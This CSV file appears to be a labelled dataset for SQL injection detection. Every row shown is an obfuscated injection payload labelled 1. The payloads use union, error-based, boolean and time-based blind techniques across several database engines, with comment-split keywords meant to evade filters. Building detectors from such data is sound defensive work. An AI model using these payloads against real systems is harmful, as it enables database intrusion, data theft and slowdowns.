Query,Label
-6244'  )   as szpd wh/**/ere 8445  =  8445 o/**/r 2724 i/**/n    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  s/**/elect   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1
"1 whe/**/re 1842  =  1842 o/**/r 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"1'  )   an/**/d   (  sel/**/ect 9067 fro/**/m  (  sel/**/ect count  (  *  )  ,concat  (  0x7171706a71,  (  s/**/elect   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floo/**/r  (  ra/**/nd  (  0  )  *2   )    )   x f/**/rom i/**/nfo/**/rmation_schema.character_s/**/ets group b/**/y x  )  a  )  ",1
"-2305' i/**/n boolean mode  )   un/**/ion all s/**/elect 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",1
"-1040 wher/**/e 3058  =  3058 unio/**/n all sel/**/ect 3058,3058,3058,3058,3058,3058,3058,3058,3058,3058--",1
"-9405'  )   un/**/ion all selec/**/t 8283,8283,8283,8283--",1
"1   )    )    as rbae w/**/here 2049  =  2049 o/**/r 6979  =  l/**/ike  (  'abcdefg',upper  (  hex  (  ra/**/ndomblob  (  500000000/2   )    )      )    )   --",1
"1  )   a/**/nd 6510  =    (  sele/**/ct count  (  *  )   fr/**/om sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1
"-7868"" unio/**/n all sel/**/ect 1805--",1
"-8038'   )    )    o/**/r elt  (  1032  =  1032,3623  )   an/**/d    (    (   'xfyq'  =  'xfyq",1
-3821'  )   o/**/r 9323  =  9323#,1
"1'||  (  sele/**/ct 'xyrk' fro/**/m dual wh/**/ere 9844  =  9844 a/**/nd 9254  =    (  sele/**/ct count  (  *  )   fr/**/om rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
1' w/**/here 5035  =  5035 an/**/d 8594  =    (  selec/**/t 8594 fr/**/om pg_sleep  (  5   )    )   --,1
1' whe/**/re 1652  =  1652 a/**/nd sleep  (  5  )  #,1
"1',  (  se/**/lect   (  case when   (  5154  =  5154  )   then 1 else 5154*  (  selec/**/t 5154 fro/**/m master..sysdataba/**/ses  )   end   )    )   ",1
"1%""   )    )     )   a/**/nd elt  (  3114  =  3114,sleep  (  5   )    )   #",1
1'   )    )    as cwss w/**/here 9720  =  9720,1
"-6475""   )    )     )   o/**/r 4144  =    (  selec/**/t upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sele/**/ct   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   fro/**/m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   fro/**/m dual  )   an/**/d    (    (     (  ""mdsx"" l/**/ike ""mdsx",1
"call regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nul/**/l  )  ,0  )  ,500000000  )  ,nul/**/l  )   an/**/d    (    (   'nbsf' li/**/ke 'nbsf",1
"1 wh/**/ere 2914  =  2914 u/**/nion all s/**/elect nu/**/ll,nul/**/l,n/**/ull#",1
"1"" a/**/nd 2006  =  2006",1
1'+  (  selec/**/t biqo whe/**/re 6046  =  6046,1
"call regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nul/**/l  )  ,0  )  ,500000000  )  ,n/**/ull  )   an/**/d ""%""  =  """,1
1' an/**/d   (  se/**/lect * f/**/rom   (  sel/**/ect  (  sleep  (  5   )    )     )  fzno  )   an/**/d 'vwve' l/**/ike 'vwve,1
1 rli/**/ke sleep  (  5  )  # urxh,1
"1'+  (  s/**/elect ummn wher/**/e 8883  =  8883 a/**/nd 4241  =  convert  (  i/**/nt,  (  s/**/elect char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  s/**/elect   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   +'",1
"1'   )    )     )   o/**/r char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nu/**/ll  )  ,0  )  ,500000000  )  ,nu/**/ll  )  --",1
"-9837"" wher/**/e 7201  =  7201 u/**/nion all selec/**/t 7201,7201,7201--",1
"1""  )    (  sel/**/ect   (  case when   (  5451  =  5451  )   then regexp_substri/**/ng  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,nu/**/ll  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   fr/**/om i/**/nfo/**/rmation_schema.system_users  )   a/**/nd   (  ""jebr"" l/**/ike ""jebr",1
"-5344"" u/**/nion all selec/**/t 9482,9482,9482,9482,9482,9482,9482,9482,9482--",1
-8069'   )    )    o/**/r 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  s/**/elect   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   a/**/nd    (    (   'qbvz'  =  'qbvz,1
"sele/**/ct benchmark  (  5000000,md5  (  0x4c4d6142   )    )    a/**/nd ""%""  =  """,1
"-6890""   )    )    o/**/r 5903  =    (  'qqpjq'||  (  s/**/elect case 5903 when 5903 then 1 else 0 end fro/**/m rdb$da/**/tabase  )  ||'qzvzq'  )   a/**/nd    (    (   ""ftho"" l/**/ike ""ftho",1
"1%'   )    )    un/**/ion all selec/**/t n/**/ull,n/**/ull,n/**/ull--",1
-3998'   )    )    o/**/r 3038  =  3038,1
"-2862'   )    )     )   unio/**/n all se/**/lect 6649,6649--",1
"1   )    )    o/**/r 4411  =    (  se/**/lect count  (  *  )   fr/**/om sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   a/**/nd    (    (   3003  =  3003",1
"1 wh/**/ere 3175  =  3175 o/**/r 8421  =    (  sel/**/ect count  (  *  )   f/**/rom generate_series  (  1,5000000   )    )   --",1
 (  selec/**/t   (  case when   (  6986  =  6986  )   then 6986 else 6986*  (  sele/**/ct 6986 fro/**/m mysql.db  )   end   )    ) ,1
"1 a/**/nd 3202  =  l/**/ike  (  'abcdefg',upper  (  hex  (  ra/**/ndomblob  (  500000000/2   )    )      )    )   -- kegk",1
"-9583'   )    )    uni/**/on all selec/**/t 6392,6392,6392,6392,6392,6392,6392,6392,6392,6392#",1
1%'   )    )     )   an/**/d 3715 i/**/n    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  se/**/lect   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   a/**/nd    (    (     (  '%'  =  ',1
1%' a/**/nd   (  s/**/elect * f/**/rom   (  selec/**/t  (  sleep  (  5   )    )     )  gcrr  )  #,1
"-5391 o/**/r make_se/**/t  (  9354  =  9354,7185  )  # ptyy",1
"-5322"" u/**/nion all se/**/lect 6494,6494,6494,6494,6494,6494--",1
s/**/elect sleep  (  5  )   a/**/nd    (    (     (  8354  =  8354,1
"1 an/**/d elt  (  4249  =  4249,7259  )  -- meef",1
1' i/**/n boolean mode  )   o/**/r   (  sel/**/ect * fro/**/m   (  s/**/elect  (  sleep  (  5   )    )     )  ydpu  )  #,1
"1""  )   as ypfa whe/**/re 6128  =  6128",1
1'+  (  se/**/lect plhk whe/**/re 6540  =  6540,1
"-3102  )   un/**/ion all sele/**/ct 6707,6707,6707,6707--",1
"1 an/**/d 4241  =  convert  (  i/**/nt,  (  se/**/lect char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  selec/**/t   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  # dwxl",1
"-9634'   )    )     )   un/**/ion all s/**/elect 4141,4141#",1
"-5640""   )    )    o/**/r 9792  =  2728--",1
"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  se/**/lect   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   a/**/nd 'ctac' l/**/ike 'ctac",1
-5764 o/**/r 3038  =  3038,1
sele/**/ct   (  case when   (  4996  =  1734  )   then 1 else 4996*  (  sel/**/ect 4996 fr/**/om master..sysdata/**/bases  )   end  )  --,1
"s/**/elect count  (  *  )   f/**/rom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 a/**/nd   (  ""snwx"" l/**/ike ""snwx",1
1 u/**/nion all s/**/elect nu/**/ll--,1
"sel/**/ect count  (  *  )   fr/**/om all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 an/**/d    (    (   ""%""  =  """,1
1' whe/**/re 8159  =  8159 uni/**/on all selec/**/t nu/**/ll#,1
"1""  )   as uuth wh/**/ere 8555  =  8555 un/**/ion all sele/**/ct nu/**/ll,n/**/ull#",1
"-6194"" o/**/r 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sel/**/ect   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   fr/**/om dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1
"sele/**/ct * fr/**/om generate_series  (  3551,3551,case when   (  3551  =  6451  )   then 1 else 0 end  )   l/**/imit 1--",1
"call regexp_substri/**/ng  (  repeat  (  right  (  char  (  2385  )  ,0  )  ,500000000  )  ,n/**/ull  )  --",1
-4313%'  )   o/**/r 6872  =  6872 a/**/nd   (  '%'  =  ',1
1'   )    )     )   an/**/d 6969  =    (  selec/**/t 6969 fr/**/om pg_sleep  (  5   )    )    an/**/d    (    (     (  'eihl'  =  'eihl,1
sel/**/ect   (  case when   (  3140  =  4625  )   then 1 else 3140*  (  sel/**/ect 3140 f/**/rom master..sysdataba/**/ses  )   end  )  --,1
"-9861' u/**/nion all sel/**/ect 5710,5710,5710,5710,5710--",1
"1 wher/**/e 8273  =  8273 u/**/nion all selec/**/t nu/**/ll,nu/**/ll,nu/**/ll,nu/**/ll,nu/**/ll,nul/**/l,n/**/ull,nul/**/l#",1
"1%'   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
"1""   )    )    as swix wher/**/e 2459  =  2459 o/**/r 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1
"1   )    )     )   an/**/d   (  s/**/elect 9067 fro/**/m  (  sele/**/ct count  (  *  )  ,concat  (  0x7171706a71,  (  sel/**/ect   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floo/**/r  (  ran/**/d  (  0  )  *2   )    )   x fr/**/om i/**/nfo/**/rmation_schema.character_se/**/ts group b/**/y x  )  a  )   an/**/d    (    (     (  8382  =  8382",1
1  )   as selm whe/**/re 5759  =  5759,1
"-6112""  )   uni/**/on all sele/**/ct 8203,8203,8203,8203,8203,8203,8203--",1
-8369  )   wh/**/ere 7234  =  7234 o/**/r/**/der b/**/y 1--,1
"1' o/**/r elt  (  6272  =  6272,sleep  (  5   )    )   ",1
"1""   )    )     )   un/**/ion all s/**/elect nu/**/ll,nu/**/ll#",1
"1   )    )     )   a/**/nd char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nul/**/l  )  ,0  )  ,500000000  )  ,n/**/ull  )   a/**/nd    (    (     (  2997  =  2997",1
"selec/**/t benchmark  (  5000000,md5  (  0x4c4d6142   )    )    an/**/d   (  ""%""  =  """,1
1'||  (  s/**/elect 'zqwd' wh/**/ere 1647  =  1647 rl/**/ike sleep  (  5   )    )   ||',1
"1""   )    )     )    (  sele/**/ct   (  case when   (  4587  =  4587  )   then regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nul/**/l  )  ,0  )  ,500000000  )  ,n/**/ull  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   f/**/rom   (  va/**/lues  (  0   )    )     )   an/**/d    (    (     (  ""fcpm""  =  ""fcpm",1
1 whe/**/re 2239  =  2239 a/**/nd 6969  =    (  se/**/lect 6969 fr/**/om pg_sleep  (  5   )    )   --,1
1'||  (  sel/**/ect 'xemx' f/**/rom dual w/**/here 4683  =  4683 o/**/r sleep  (  5  )  #,1
s/**/elect   (  case when   (  4291  =  6937  )   then 4291 else 4291*  (  sel/**/ect 4291 fr/**/om mysql.db  )   end  )  #,1
"1""  )   wh/**/ere 8462  =  8462 an/**/d upda/**/texml  (  3393,concat  (  0x2e,0x7171706a71,  (  selec/**/t   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1
"-1055' u/**/nion all s/**/elect 7758,7758,7758,7758,7758,7758--",1
"-2630'   )    )    as xavw whe/**/re 6291  =  6291 uni/**/on all s/**/elect 6291,6291,6291,6291,6291,6291,6291,6291,6291#",1
"1' whe/**/re 8451  =  8451 unio/**/n all sele/**/ct nu/**/ll,nul/**/l,n/**/ull,nu/**/ll,n/**/ull,nu/**/ll,nul/**/l,n/**/ull,nu/**/ll#",1
1' wh/**/ere 8635  =  8635 o/**/r/**/der b/**/y 1--,1
-8447 whe/**/re 2850  =  2850 o/**/r 7147  =  3262,1
"1 a/**/nd elt  (  4249  =  4249,7259  )  ",1
"1%'   )    )    o/**/r 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"1"" w/**/here 6179  =  6179",1
1'  )   w/**/here 6842  =  6842,1
"1'   )    )    as qzyp w/**/here 5081  =  5081 o/**/r 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1
-3937   )    )    o/**/r 3038  =  3038,1
"1%' o/**/r 8315  =    (  sel/**/ect count  (  *  )   fro/**/m sysibm.syst/**/ables as t1,sysibm.systa/**/bles as t2,sysibm.systab/**/les as t3  )   a/**/nd '%'  =  '",1
1'+  (  sel/**/ect 'diet' w/**/here 7004  =  7004 rlik/**/e sleep  (  5   )    )   +',1
1'  )   as cdrm wh/**/ere 4595  =  4595 o/**/rde/**/r b/**/y 1#,1
"1""   )    )    as zbfj whe/**/re 2285  =  2285",1
"1'  )   wh/**/ere 4407  =  4407 a/**/nd char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nu/**/ll  )  ,0  )  ,500000000  )  ,nu/**/ll  )  --",1
1 an/**/d 4595  =  4595#,1
-9429'  )   o/**/rde/**/r b/**/y 1--,1
1%'   )    )    rli/**/ke   (  s/**/elect   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    a/**/nd    (    (   '%'  =  ',1
"1""   )    )    a/**/nd 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    an/**/d    (    (   ""alkz""  =  ""alkz",1
sele/**/ct   (  case when   (  5152  =  7853  )   then 5152 else 5152*  (  sele/**/ct 5152 fr/**/om mysql.db  )   end  )  #,1
"1%"" unio/**/n all selec/**/t nul/**/l,nul/**/l,nul/**/l,nul/**/l,nu/**/ll,n/**/ull#",1
"1 o/**/r 5356  =    (  sele/**/ct count  (  *  )   f/**/rom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1'   )    )     )   a/**/nd 8514  =    (  se/**/lect count  (  *  )   f/**/rom domai/**/n.domai/**/ns as t1,domai/**/n.columns as t2,domai/**/n.ta/**/bles as t3  )   an/**/d    (    (     (  'peyy'  =  'peyy",1
"1  )   a/**/nd elt  (  3114  =  3114,sleep  (  5   )    )   #",1
"1  )   as zmjm wh/**/ere 9125  =  9125 o/**/r char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substri/**/ng  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,n/**/ull  )  --",1
"-7802'   )    )     )   o/**/r elt  (  8778  =  9974,9974  )   a/**/nd    (    (     (  'glsq' lik/**/e 'glsq",1
1 o/**/r sleep  (  5  )  #,1
"1"" a/**/nd elt  (  1210  =  1210,sleep  (  5   )    )    a/**/nd ""zhxm""  =  ""zhxm",1
"1   )    )    as myyh wh/**/ere 5116  =  5116 o/**/r 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"1',  (  sele/**/ct   (  case when   (  4209  =  5879  )   then 1 else 4209*  (  s/**/elect 4209 f/**/rom i/**/nfo/**/rmation_schema.character_s/**/ets  )   end   )    )   ",1
1'  )   rlik/**/e   (  sele/**/ct   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    an/**/d   (  'gzpx'  =  'gzpx,1
"1'  )   o/**/r   (  se/**/lect 2*  (  if   (    (   sel/**/ect * f/**/rom   (  sel/**/ect concat  (  0x7171706a71,  (  sel/**/ect   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   an/**/d   (  'bzgs' lik/**/e 'bzgs",1
"-2314""   )    )    o/**/r make_s/**/et  (  9354  =  9354,7185  )   a/**/nd    (    (   ""uatq"" l/**/ike ""uatq",1
"sele/**/ct benchmark  (  5000000,md5  (  0x4c4d6142   )    )    a/**/nd   (  'dvpw'  =  'dvpw",1
"1'   )    )    as nxhp w/**/here 2649  =  2649 o/**/r 9643  =    (  selec/**/t count  (  *  )   fr/**/om domai/**/n.domai/**/ns as t1,domai/**/n.columns as t2,domai/**/n.ta/**/bles as t3  )  --",1
"-2287'   )    )    uni/**/on all sel/**/ect 1200,1200,1200,1200,1200#",1
"-6184""   )    )    o/**/r 2724 i/**/n    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  sele/**/ct   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   a/**/nd    (    (   ""rovr""  =  ""rovr",1
sele/**/ct   (  case when   (  6002  =  9048  )   then 6002 else 6002*  (  selec/**/t 6002 f/**/rom mysql.db  )   end  )  #,1
1'||  (  sele/**/ct 'ywfo' fr/**/om dual w/**/here 4168  =  4168 rli/**/ke sleep  (  5  )  #,1
"1"" o/**/r 6793  =    (  se/**/lect 6793 fro/**/m pg_sleep  (  5   )    )    an/**/d ""pwwb"" li/**/ke ""pwwb",1
"1%'   )    )     )    (  s/**/elect   (  case when   (  4587  =  4587  )   then regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nu/**/ll  )  ,0  )  ,500000000  )  ,nul/**/l  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   fro/**/m   (  val/**/ues  (  0   )    )     )   a/**/nd    (    (     (  '%'  =  '",1
"1""   )    )    a/**/nd   (  sele/**/ct 2*  (  if   (    (   selec/**/t * f/**/rom   (  sel/**/ect concat  (  0x7171706a71,  (  s/**/elect   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   a/**/nd    (    (   ""llgb"" lik/**/e ""llgb",1
"-5202 uni/**/on all se/**/lect 5332,5332,5332,5332,5332,5332,5332#",1
"1""  )   an/**/d 6969  =    (  sele/**/ct 6969 fro/**/m pg_sleep  (  5   )    )    an/**/d   (  ""btht""  =  ""btht",1
"-6307' w/**/here 8916  =  8916 un/**/ion all sele/**/ct 8916,8916,8916,8916,8916,8916,8916--",1
"1' i/**/n boolean mode  )   o/**/r extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  selec/**/t   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   #",1
1   )    )    un/**/ion all sele/**/ct n/**/ull#,1
"-4955%' un/**/ion all sele/**/ct 5928,5928--",1
"1' a/**/nd elt  (  2266  =  7467,7467  )  ",1
1' an/**/d   (  se/**/lect * fr/**/om   (  selec/**/t  (  sleep  (  5   )    )     )  fzno  )   a/**/nd 'mepp'  =  'mepp,1
"1,  (  sel/**/ect   (  case when   (  3717  =  3717  )   then 1 else 3717*  (  selec/**/t 3717 fro/**/m master..sysdataba/**/ses  )   end   )    )   ",1
"1'  )   o/**/r elt  (  6272  =  6272,sleep  (  5   )    )    a/**/nd   (  'tmbs'  =  'tmbs",1
-4901  )   o/**/r 3407  =  6442#,1
1' whe/**/re 4134  =  4134 an/**/d 1102  =  6300--,1
"1'   )    )     )   an/**/d extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  se/**/lect   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    an/**/d    (    (     (  'hllf'  =  'hllf",1
"-1598""   )    )    o/**/r elt  (  5329  =  9628,9628  )   a/**/nd    (    (   ""hyxq"" l/**/ike ""hyxq",1
 (  se/**/lect * fr/**/om   (  se/**/lect  (  sleep  (  5   )    )     )  srmq   )    )   +',1
"1""  )   o/**/r   (  se/**/lect * fro/**/m   (  sele/**/ct  (  sleep  (  5   )    )     )  sddo  )  #",1
"-3604'  )   as fyev wher/**/e 7259  =  7259 u/**/nion all s/**/elect 7259,7259,7259,7259--",1
-6433%'   )    )    o/**/r 9323  =  9323#,1
-8836%'  )   o/**/r 4856  =  3891,1
"1 a/**/nd 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
"1%'   )    )    o/**/r 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   an/**/d    (    (   '%'  =  '",1
 (  7098  =  7098 a/**/nd sleep  (  5   )    ) ,1
"1""  )   as jiyl w/**/here 4893  =  4893 u/**/nion all selec/**/t nul/**/l,nu/**/ll,nul/**/l,n/**/ull,nu/**/ll#",1
-3243 o/**/r 2266  =  3583#,1
"1'  )   uni/**/on all sel/**/ect n/**/ull,n/**/ull,nu/**/ll,nu/**/ll,n/**/ull--",1
"1%""   )    )     )   an/**/d 3202  =  l/**/ike  (  'abcdefg',upper  (  hex  (  ran/**/domblob  (  500000000/2   )    )      )    )    an/**/d    (    (     (  ""%""  =  """,1
"1' a/**/nd extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  sele/**/ct   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    a/**/nd 'pphf'  =  'pphf",1
"1""   )    )    rl/**/ike   (  s/**/elect * fr/**/om   (  sel/**/ect  (  sleep  (  5   )    )     )  sgvo  )   an/**/d    (    (   ""bxct"" lik/**/e ""bxct",1
-9120'   )    )    o/**/r 8571  =  8571--,1
1'+  (  se/**/lect naiw whe/**/re 4924  =  4924,1
-9389'  )   o/**/r 8859  =  3989--,1
"-9923%'   )    )     )   u/**/nion all s/**/elect 8985,8985,8985,8985,8985,8985,8985#",1
1'   )    )    a/**/nd 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sel/**/ect   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   f/**/rom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   an/**/d    (    (   'hbwk' lik/**/e 'hbwk,1
"1""  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  s/**/elect   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   an/**/d   (  ""tgdu""  =  ""tgdu",1
"-1510'   )    )     )   unio/**/n all sele/**/ct 8755,8755,8755,8755,8755,8755,8755,8755,8755,8755--",1
"1""  )   uni/**/on all sele/**/ct nu/**/ll,nul/**/l,n/**/ull,nu/**/ll,nul/**/l,nul/**/l,nul/**/l#",1
"elt  (  8192  =  8192,sleep  (  5   )    )   ",1
end an/**/d    (    (   'zeyr'  =  'zeyr,1
"1""   )    )    as luon whe/**/re 4676  =  4676 rl/**/ike sleep  (  5  )  #",1
"1""  )   wher/**/e 6138  =  6138 a/**/nd 8594  =    (  se/**/lect 8594 fro/**/m pg_sleep  (  5   )    )   --",1
"1"" whe/**/re 3740  =  3740 rli/**/ke sleep  (  5  )  #",1
"1'   )    )     )   an/**/d elt  (  4249  =  4249,7259  )   an/**/d    (    (     (  'kgdt' lik/**/e 'kgdt",1
1  )   as tngy wher/**/e 8956  =  8956 rlik/**/e   (  sele/**/ct   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,1
"-4230""   )    )     )   uni/**/on all sele/**/ct 6962,6962,6962,6962,6962,6962#",1
-3540 w/**/here 7302  =  7302 o/**/r 4493  =  utl_i/**/naddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selec/**/t   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   fro/**/m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1
"1  )   as lfra wh/**/ere 2669  =  2669 a/**/nd updat/**/exml  (  3393,concat  (  0x2e,0x7171706a71,  (  se/**/lect   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1
1'  )   rl/**/ike sleep  (  5  )   an/**/d   (  'qsub' lik/**/e 'qsub,1
"1%""   )    )     )   unio/**/n all s/**/elect nul/**/l,nu/**/ll,nul/**/l,n/**/ull,nul/**/l,n/**/ull,nu/**/ll,nu/**/ll--",1
"1'+  (  s/**/elect 'uzaw' w/**/here 9900  =  9900 o/**/r 8315  =    (  sele/**/ct count  (  *  )   fro/**/m sysibm.syst/**/ables as t1,sysibm.systab/**/les as t2,sysibm.systa/**/bles as t3   )    )   +'",1
"1""  )   as dlfq w/**/here 8410  =  8410",1
"1  )   as guru w/**/here 7615  =  7615 uni/**/on all se/**/lect nu/**/ll,n/**/ull,nul/**/l,nul/**/l,nul/**/l,nul/**/l,nul/**/l,nul/**/l,nul/**/l,nu/**/ll#",1
